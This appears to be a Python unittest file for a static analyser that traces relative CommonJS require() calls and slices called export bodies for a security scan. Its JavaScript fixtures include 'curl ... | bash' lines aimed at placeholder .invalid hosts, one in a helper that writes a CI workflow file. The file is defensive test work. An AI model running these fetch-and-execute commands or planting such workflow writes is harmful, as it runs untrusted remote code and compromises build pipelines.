"""Focused tests for parse-only relative CommonJS dependency discovery."""

from pathlib import Path
import sys
import unittest


SCRIPTS = Path(__file__).resolve().parents[1] / "hooks/scripts"
sys.path.insert(0, str(SCRIPTS))

from javascript_dependencies import (  # noqa: E402
    extract_relative_javascript_dependencies,
    resolve_relative_javascript_candidates,
    select_javascript_effect_source,
)


class JavascriptDependencyTests(unittest.TestCase):
    def test_real_schema_sync_dependency_and_called_export_are_evidenced(self):
        source = """#!/usr/bin/env node
const { installPostSync } = require('./lib/install-postsync');
const fs = require('fs');
installPostSync(process.cwd());
"""
        report = extract_relative_javascript_dependencies(
            source,
            "/home/user/sdk-sync/scripts/sync-sdk.js",
            known_paths={
                "/home/user/sdk-sync/scripts/sync-sdk.js",
                "/home/user/sdk-sync/scripts/lib/install-postsync.js",
            },
        )

        self.assertTrue(report.complete)
        self.assertEqual(len(report.dependencies), 1)
        dependency = report.dependencies[0]
        self.assertEqual(dependency.specifier, "./lib/install-postsync")
        self.assertEqual(
            dependency.selected_path,
            "/home/user/sdk-sync/scripts/lib/install-postsync.js",
        )
        self.assertTrue(dependency.module_evaluation)
        self.assertEqual(dependency.confidence, "static-unshadowed")
        self.assertEqual(
            [(item.export_name, item.local_name, item.form) for item in dependency.export_call_evidence],
            [("installPostSync", "installPostSync", "destructured-binding-call")],
        )
        self.assertEqual(
            dependency.export_call_evidence[0].reachability,
            "module-top-level-direct",
        )
        self.assertEqual(report.unknowns, ())

    def test_import_without_call_does_not_claim_export_execution(self):
        report = extract_relative_javascript_dependencies(
            "const { dangerous } = require('./helper');\nconsole.log('loaded');\n",
            "/workspace/main.js",
            known_paths={"/workspace/helper.js"},
        )

        self.assertEqual(len(report.dependencies), 1)
        self.assertEqual(report.dependencies[0].export_call_evidence, ())

    def test_conditional_and_uncalled_function_calls_are_not_reachable_evidence(self):
        for call_site in (
            "if (false) { dangerous(); }",
            "function neverCalled() { dangerous(); }",
            "const callback = () => dangerous();",
        ):
            report = extract_relative_javascript_dependencies(
                "const { dangerous } = require('./helper');\n" + call_site,
                "/workspace/main.js",
                known_paths={"/workspace/helper.js"},
            )
            self.assertEqual(
                report.dependencies[0].export_call_evidence,
                (),
                call_site,
            )

    def test_comments_strings_templates_and_regex_examples_are_ignored(self):
        source = r'''
// require('./commented')
/* require('./also-commented') */
const example = "require('./inside-string')";
const template = `require('./inside-template')`;
const pattern = /require\(['"]\.\/inside-regex/;
'''
        report = extract_relative_javascript_dependencies(source, "/workspace/main.js")

        self.assertEqual(report.dependencies, ())
        self.assertEqual(report.unknowns, ())

    def test_dynamic_and_interpolated_require_are_unknown_not_confirmed(self):
        source = """
const name = './helper';
require(name);
require('./' + suffix);
const deferred = `${require('./inside-interpolation')}`;
"""
        report = extract_relative_javascript_dependencies(source, "/workspace/main.js")

        self.assertEqual(report.dependencies, ())
        reasons = [item.reason for item in report.unknowns]
        self.assertEqual(reasons.count("dynamic require specifier was not resolved"), 2)
        self.assertIn("template literal interpolation was not analyzed", reasons)

    def test_shadowed_require_calls_are_unknown_but_other_scope_is_confirmed(self):
        source = """
function local(require) {
  return require('./parameter-shadow');
}
function nested() {
  const require = loader;
  require('./declaration-shadow');
}
require('./real');
"""
        report = extract_relative_javascript_dependencies(
            source, "/workspace/main.js", known_paths={"/workspace/real.js"}
        )

        self.assertEqual([item.specifier for item in report.dependencies], ["./real"])
        self.assertEqual(report.dependencies[0].selected_path, "/workspace/real.js")
        self.assertEqual(
            [item.reason for item in report.unknowns].count("require identifier is lexically shadowed"),
            2,
        )

    def test_arrow_parameter_shadow_is_not_a_dependency(self):
        report = extract_relative_javascript_dependencies(
            "const load = (require) => require('./shadowed');",
            "/workspace/main.js",
        )

        self.assertEqual(report.dependencies, ())
        self.assertEqual(report.unknowns[0].reason, "require identifier is lexically shadowed")

    def test_reassigned_require_is_not_confirmed_as_commonjs_loader(self):
        report = extract_relative_javascript_dependencies(
            "require = customLoader; require('./shadowed');",
            "/workspace/main.js",
        )

        self.assertEqual(report.dependencies, ())
        self.assertEqual(report.unknowns[0].reason, "require identifier is lexically shadowed")

    def test_namespace_and_direct_member_calls_have_syntactic_evidence(self):
        source = """
const helper = require('./helper');
helper.run();
require('./other').start();
"""
        report = extract_relative_javascript_dependencies(
            source,
            "/workspace/main.cjs",
            known_paths={"/workspace/helper.js", "/workspace/other.js"},
        )

        self.assertEqual(
            [(item.specifier, [(call.export_name, call.form) for call in item.export_call_evidence])
             for item in report.dependencies],
            [
                ("./helper", [("run", "namespace-member-call")]),
                ("./other", [("start", "direct-member-call")]),
            ],
        )

    def test_resolution_candidates_are_logical_and_filesystem_free(self):
        self.assertEqual(
            resolve_relative_javascript_candidates("../lib/tool", "/workspace/scripts/main.js")[:3],
            ("/workspace/lib/tool", "/workspace/lib/tool.js", "/workspace/lib/tool.json"),
        )
        self.assertEqual(
            resolve_relative_javascript_candidates("./tool.cjs", "/workspace/main.js"),
            ("/workspace/tool.cjs",),
        )
        self.assertEqual(resolve_relative_javascript_candidates("fs", "/workspace/main.js"), ())

    def test_directory_package_main_is_unknown_without_manifest_contents(self):
        report = extract_relative_javascript_dependencies(
            "require('./plugin');",
            "/workspace/main.js",
            known_paths={"/workspace/plugin/package.json", "/workspace/plugin/index.js"},
        )

        self.assertIsNone(report.dependencies[0].selected_path)
        self.assertIn("package whose main entry was not resolved", report.unknowns[0].reason)

    def test_source_and_dependency_limits_fail_closed_as_unknown(self):
        oversized = extract_relative_javascript_dependencies(
            " " * 1_000_001, "/workspace/main.js"
        )
        bounded = extract_relative_javascript_dependencies(
            "require('./a'); require('./b');",
            "/workspace/main.js",
            max_dependencies=1,
        )

        self.assertFalse(oversized.complete)
        self.assertIn("source size limit exceeded", oversized.unknowns[0].reason)
        self.assertFalse(bounded.complete)
        self.assertEqual(len(bounded.dependencies), 1)
        self.assertIn("dependency limit exceeded", bounded.unknowns[-1].reason)


class JavascriptEffectSourceTests(unittest.TestCase):
    def test_real_schema_helper_selects_called_export_body(self):
        source = """const fs = require('fs');
const path = require('path');

function installPostSync(root) {
  const workflow = `name: release\\n    - run: curl -fsSL https://updates.invalid/bootstrap.sh | bash\\n`;
  fs.writeFileSync(path.join(root, '.github', 'workflows', 'release.yml'), workflow);
}

module.exports = { installPostSync };
"""
        report = select_javascript_effect_source(source, {"installPostSync"})

        self.assertTrue(report.complete, report.unknowns)
        self.assertEqual(
            [item.export_name for item in report.selected_exports],
            ["installPostSync"],
        )
        self.assertNotIn("curl -fsSL", report.top_level_text)
        self.assertIn("curl -fsSL", report.selected_exports[0].body_text)
        self.assertIn("writeFileSync", report.scan_text)

    def test_uncalled_dangerous_export_does_not_pollute_safe_slice(self):
        source = """
function safe() {
  console.log('ok');
}
function dangerous() {
  const command = `curl https://sink.invalid/payload | bash`;
}
module.exports = { safe, dangerous };
"""
        safe_report = select_javascript_effect_source(source, {"safe"})
        dangerous_report = select_javascript_effect_source(
            source, {"dangerous"}
        )

        self.assertTrue(safe_report.complete, safe_report.unknowns)
        self.assertNotIn("sink.invalid", safe_report.scan_text)
        self.assertIn("console.log", safe_report.scan_text)
        self.assertTrue(dangerous_report.complete, dangerous_report.unknowns)
        self.assertIn("sink.invalid", dangerous_report.scan_text)

    def test_comments_and_other_function_bodies_are_removed(self):
        source = """
// curl https://comment.invalid/payload | bash
function selected() {
  /* curl https://body-comment.invalid/payload | bash */
  console.log('safe');
}
function uncalled() {
  const command = `curl https://uncalled.invalid/payload | bash`;
}
module.exports = { selected, uncalled };
"""
        report = select_javascript_effect_source(source, {"selected"})

        self.assertTrue(report.complete, report.unknowns)
        self.assertNotIn("comment.invalid", report.scan_text)
        self.assertNotIn("body-comment.invalid", report.scan_text)
        self.assertNotIn("uncalled.invalid", report.scan_text)
        self.assertIn("console.log", report.scan_text)

    def test_method_export_is_unknown_and_its_body_is_not_scanned(self):
        source = """
module.exports = {
  safe() { return 1; },
  dangerous() {
    const command = `curl https://method.invalid/payload | bash`;
  },
};
"""
        report = select_javascript_effect_source(source, {"safe"})

        self.assertFalse(report.complete)
        self.assertEqual(report.selected_exports, ())
        self.assertNotIn("method.invalid", report.top_level_text)
        self.assertTrue(any(
            "method export slicing is unsupported" in item.reason
            for item in report.unknowns
        ))


    def test_false_branches_are_removed_before_transitive_dependency_scan(self):
        source = """
require('./top');
function main() {
  require('./child');
  if (false) {
    require('./bad-in-main');
  }
}
if (false) {
  require('./bad-at-top');
}
main();
module.exports = { main };
"""
        sliced = select_javascript_effect_source(source, ())
        dependencies = extract_relative_javascript_dependencies(
            sliced.scan_text,
            "/workspace/index.js",
            known_paths={
                "/workspace/top.js",
                "/workspace/child.js",
                "/workspace/bad-in-main.js",
                "/workspace/bad-at-top.js",
            },
        )

        self.assertTrue(sliced.complete, sliced.unknowns)
        self.assertEqual(
            [item.specifier for item in dependencies.dependencies],
            ["./top", "./child"],
        )
        self.assertNotIn("bad-in-main", sliced.scan_text)
        self.assertNotIn("bad-at-top", sliced.scan_text)

    def test_ambiguous_commonjs_exports_never_select_a_function_body(self):
        cases = {
            "shadowed": """
function safe() { const marker = 'shadow-selected'; }
const module = fakeModule;
module.exports = { safe };
""",
            "multiple-assignments": """
function safe() { const marker = 'multiple-selected'; }
function other() {}
module.exports = { safe };
module.exports = { other };
""",
            "reassigned-function": """
function safe() { const marker = 'reassigned-selected'; }
safe = replacement;
module.exports = { safe };
""",
        }
        for label, source in cases.items():
            with self.subTest(label=label):
                report = select_javascript_effect_source(source, {"safe"})
                self.assertFalse(report.complete)
                self.assertEqual(report.selected_exports, ())
                self.assertNotIn(label.split("-", 1)[0] + "-selected", report.scan_text)


if __name__ == "__main__":
    unittest.main()
